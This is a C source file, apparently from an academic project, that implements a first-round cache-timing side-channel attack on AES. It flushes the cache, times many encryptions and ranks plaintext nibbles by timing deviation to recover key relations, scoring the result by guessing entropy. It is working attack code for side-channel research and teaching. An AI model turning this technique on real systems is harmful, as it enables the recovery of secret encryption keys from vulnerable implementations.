/******************************************************************************
 * File	Name			: attack.c
 * Organization			: Indian Institute of Technology Kharagpur
 * Project Involved		: First Round Attack on AES
 * Author		    	: Chester Rebeiro 
 * Date of Creation		: 15/Dec/2012
 * Date of freezing		: 
 * Log Information regading 
 * maintanance			:
 * Synopsis			: 
 ******************************************************************************/
#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdlib.h>

#include <aes.h>

#include "params.h"

#define ITERATIONS (1 << 22)              /* The maximum iterations for making the statistics */

AES_KEY expanded;

#define TIME_THRESHOLD     8000    // To remove outliers due to context switch

unsigned char pt[16];               /* Holds the Plaintext */
unsigned char ct[16];               /* Holds the ciphertext */

unsigned int ttime[16][16];         /* Holds the timing     */
unsigned int tcount[16][16];        /* Holds the count      */
double tavg[16][16];                /* ttime[x]/tcount[x]   */
double deviations[16][16];          /* Deviations from tavgavg */
double tavgavg;                     /* Average of all timings */

int correct_4bits[] = {0, 0, 0, 0, 6, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};		// Added to compute GE

struct mypair {
	int idx;
	double deviation;
};

int cmp (const void *p1, const void *p2) {
	if ((*(struct mypair*)p1).deviation > (*(struct mypair*)p2).deviation) return 0;
	else return 1;
}

void printtime()
{
	int i, c;
	FILE *f;

	f = fopen("log", "w");
	for(c=4; c<16; ++c){
		fprintf(f, ".............%d.........\n", c);
		for(i=0; i<16; ++i){
			fprintf(f, "%d  %.3f  %.4f\n", i, tavg[c][i], deviations[c][i]);
		}
	}
	fclose(f);
}

unsigned int finddeviant(unsigned int c)
{
	int i, maxi;
	double ttimesum, tcountsum;
	double maxdeviation;

	/* Compute average timing for c */
	ttimesum = 0;
	tcountsum = 0;
	for(i=0; i<16; ++i){
		tavg[c][i] = ttime[c][i] / (float)tcount[c][i];	
		ttimesum += ttime[c][i];
		tcountsum += tcount[c][i];
	}	
	tavgavg = ttimesum/tcountsum;

	/* Compute deviations from the average time */
	for(i=0; i<16; ++i){
		deviations[c][i] = fabs(tavg[c][i] - tavgavg);
	}	

	/* Find the maximum deviation, this is the possible leakage */
	maxdeviation = deviations[c][0];
	maxi = 0;
	for(i=1; i<16; ++i){
		if(maxdeviation < deviations[c][i]){
			maxdeviation = deviations[c][i];
			maxi = i;
		}
	}

	return maxi;
}

int findGE() {
	int guess_entropy = 0;
	for (int c = 4; c < 16; ++c) {
		struct mypair mat[16];
		for (int i = 0; i < 16; ++i) {
			mat[i].idx = i;
			mat[i].deviation = deviations[c][i];
		}
		qsort((void*)mat, 16, sizeof(mat[0]), cmp);
		// for (int i = 0; i < 16; ++i) printf("%d %.4f\n", mat[i].idx, mat[i].deviation);
		for (int i = 0; i < 16; ++i) 
			if (mat[i].idx == correct_4bits[c]) {
				guess_entropy += (i + 1);
			}
	}
	return guess_entropy;
}

void findkeys()
{
	int c=4, dummy;
	for (c=4; c<16; ++c)
		printf("%02d(%x) ", c, finddeviant(c));
	int ge_value = findGE();
	printf("%d", ge_value);
	printf("\n");
}

double attackrnd1()
{
	int ii=0, i;
	unsigned int start, end, timing;

	while(ii++ <= (ITERATIONS)){
		/* Set a random plaintext */
		for(i=0; i<16; ++i) pt[i] = random() & 0xff;
		/* Fix a few plaintext bits of some plaintext bytes */
		pt[0] = pt[0] & 0x0f;
		pt[1] = pt[1] & 0x0f;
		pt[2] = pt[2] & 0x0f;
		pt[3] = pt[3] & 0x0f;

		/* clean the cache memory of any AES data */
		cleancache();	

		/* Make the encryption */
		start = timestamp();
		AES_encrypt(pt, ct, &expanded);
		end = timestamp();

		timing = end - start;

		if(ii > 1000 && timing < TIME_THRESHOLD){      
			/* Record the timings */
			for(i=4; i<16; ++i){
				ttime[i][pt[i] >> 4] += timing;
				tcount[i][pt[i] >> 4] += 1;	
			}	
			
			/* print if its time */
			if (!(ii & (ii - 1))){
				printf("%08x\t", ii);
				findkeys();
				printtime(4);
			}
		}
	}
}


void ReadKey(const unsigned char *filename)
{
	int i;
	FILE *f;
	unsigned int i_secretkey[16]; 
	unsigned char uc_secretkey[16]; 

	/* Read key from a file */
	if((f = fopen(filename, "r")) == NULL){
		printf("Cannot open key file\n");
		exit(-1);
	}
	for(i=0; i<16; ++i){
		fscanf(f, "%x", &i_secretkey[i]);
		uc_secretkey[i] = (unsigned char) i_secretkey[i];
	}
	fclose(f);
	AES_set_encrypt_key(uc_secretkey, 128, &expanded);
}

/* 
 * The main 
 */
int main(int argc, char **argv)
{
	srandom(timestamp());

	ReadKey("key");
	printf("Getting First Round Key Relations\n");
	attackrnd1();
}

